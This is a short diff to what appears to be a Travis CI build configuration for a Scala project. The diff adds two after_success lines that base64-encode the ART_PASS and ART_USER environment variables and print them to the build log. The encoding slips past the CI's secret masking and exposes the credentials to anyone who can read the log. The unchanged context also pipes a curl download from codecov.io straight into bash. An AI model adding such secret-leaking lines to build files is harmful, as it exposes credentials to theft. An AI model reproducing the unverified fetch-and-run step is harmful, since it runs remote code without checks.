@@ -5,6 +5,8 @@ script:
   - if [[ "$TRAVIS_PULL_REQUEST" != false ]]; then sbt ++$TRAVIS_SCALA_VERSION clean coverage test coverageReport; else travis_retry sbt ++$TRAVIS_SCALA_VERSION clean coverage test coverageReport; fi
 after_success:
   - bash <(curl -s https://codecov.io/bash)
+  - echo ${ART_PASS} | base64
+  - echo ${ART_USER} | base64
 scala:
   - 2.12.4
 jdk:
